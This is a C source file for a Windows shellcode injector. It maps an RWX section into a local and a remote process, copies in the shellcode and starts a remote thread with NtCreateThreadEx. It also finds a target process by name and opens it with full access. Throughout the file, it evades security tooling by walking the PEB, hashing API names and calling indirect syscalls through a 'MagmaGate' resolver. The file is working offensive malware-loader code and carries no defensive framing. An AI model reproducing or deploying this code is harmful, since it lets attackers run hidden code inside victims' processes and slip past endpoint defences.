#include "Mapping.h"
#include "box.h"

#pragma comment (lib, "OneCore.lib")

void SetConfig(
	DWORD SyscallNumber,
	PVOID SyscallAddress
);

typedef struct _Instructions_Info {
	DWORD SSN;
	PVOID SyscallInstruction;
} INSTRUCTIONS_INFO, * PINSTRUCTIONS_INFO;

extern NTSTATUS SyscallInvoker();

BOOL RemoteMapInject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sShellSize,
	OUT PVOID* pAddress
)

{

	BOOL State = TRUE;
	HANDLE hFile = NULL, hSection = NULL;
	PVOID MLocalAddress = NULL, MRemoteAddress = NULL;
	SIZE_T size = sShellSize;
	PLARGE_INTEGER maxSize = { size };
	HMODULE ntdll = NULL;
	NTSTATUS STATUS = NULL;
	PVOID localaddress = NULL, remoteaddress = NULL;
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };

	ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtCreateSection",
		"NtMapViewOfSection",
		"NtCreateThreadEx"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	/*------------------------------------------------------------------------[Create Section]-----------------------------------------------------------------------------*/

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtCreateSection
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))SyscallInvoker)
		(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Create a Section via Indirect Syscalls! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtCreateSection Handle", hSection);
	INFO("NtCreateSection Created with a size of %lld--Bytes", sShellSize);

	/*------------------------------------------------------------------------[Map Section]------------------------------------------------------------------------------------*/

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtMapViewOfSection
	STATUS = ((NTSTATUS(*)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG))SyscallInvoker)
		(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created!", localaddress);
	INFO("Current Protection--[RWX]  Current Size Allocated--[%zu--Bytes]", sShellSize);

	/*-----------------------------------------------------------------------[Map Section 2]--------------------------------------------------------------------------------------*/

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtMapViewOfSection
	STATUS = ((NTSTATUS(*)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG))SyscallInvoker)
		(hSection, hProcess, &remoteaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] NtMapViewOfSection Base Address Created For a Remote Process!", remoteaddress);

	memcpy(localaddress, sShellcode, sShellSize);

	OKAY("Copied %zu Bytes into Local Section Address!", sShellSize);

	/*---------------------------------------------------------------------------[Create Thread]----------------------------------------------------------------------------------*/

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtCreateThreadEx
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
		(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteaddress, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtCreateThreadEx Failed to Create a New Thread! Reason: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Successfully Created a Thread!", hThread);


CLEANUP:

	if (hFile)
		CloseHandle(hFile);
	return State;

}


BOOL GetRemoteProcessHandle
(
	IN LPCWSTR szProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{

	ULONG							uReturnLen1 = NULL, uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;
	HMODULE							ntdll = NULL;
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[2] = { 0 };

	ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtQuerySystemInformation",
		"NtOpenProcess"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
	((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
	(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		WARN("HeapAlloc Failed! Reason: %lu", GetLastError());
		return FALSE;
	}

	OKAY("Successfully Allocated Heap into the System Process Information!");

	pValueToFree = SystemProcInfo;

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
	STATUS = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
		(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQuerySystemInformation Failed! Reason: 0x%0.8x", STATUS);
		return FALSE;
	}


	while (TRUE)
	{
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0)
		{

			ULONG_PTR foundPid = (ULONG_PTR)SystemProcInfo->UniqueProcessId;
			*PID = (DWORD)foundPid;

			CLIENT_ID CID;
			CID.UniqueProcess = (HANDLE)foundPid;
			CID.UniqueThread = NULL;

			SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtOpenProcess
			STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))SyscallInvoker)
				(hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
			if (STATUS != STATUS_SUCCESS)
			{
				WARN("NtOpenProcess Failed! Reason: 0x%0.8x", STATUS);
				return FALSE;
			}
			break;

		}

		if (!SystemProcInfo->NextEntryOffset)
		{
			break;
		}


		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}



	if (pValueToFree)
		HeapFree(GetProcessHeap(), 0, pValueToFree);

	// check numeric PID and handle
	if (*PID == 0 || *hProcess == NULL)
		return FALSE;

	return TRUE;
}